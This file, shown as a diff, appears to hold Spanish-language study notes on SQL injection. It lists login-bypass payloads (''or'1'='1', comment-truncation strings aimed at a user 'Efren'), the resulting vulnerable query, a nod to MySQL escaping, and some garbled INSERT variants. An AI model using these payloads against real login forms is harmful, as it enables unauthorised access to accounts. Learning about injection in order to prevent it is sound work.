@@ -1,0 +1,34 @@
+*************************************************************
+Ejecutar un login por defecto
+*************************************************************
+Usuario: 'or'1'='1
+Contraseña:     
+RESULTADO-->LOGIN SUCCESSFUL!
+##############################################################
+
+*************************************************************
+Poner Usuario y después como contraseña la siguiente sentencia
+*************************************************************
+' OR usuario='Efren' -- 
+Con espacio después de las dos línea
+##############################################################
+
+
+*************************************************************
+Poner la siguiente sentencia y después como contraseña lo que sea
+*************************************************************
+Efren' -- 
+Después de los guiones un espacio
+
+##############################################################
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+select * from usuario where usuario =''or '1'='1' and contraseña=''or '1'='1'
+mysql_real_scape
+
+INSERT INTO EMPLOYEE (id, usuario,contraseña) VALUES ("28", "Hacker","testHacker")or 1=1
+INSERT INTO EMPLOYEE ("id", "usuario","contraseña" ) VALUES ("15", "Hacker","test") or 1=1
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
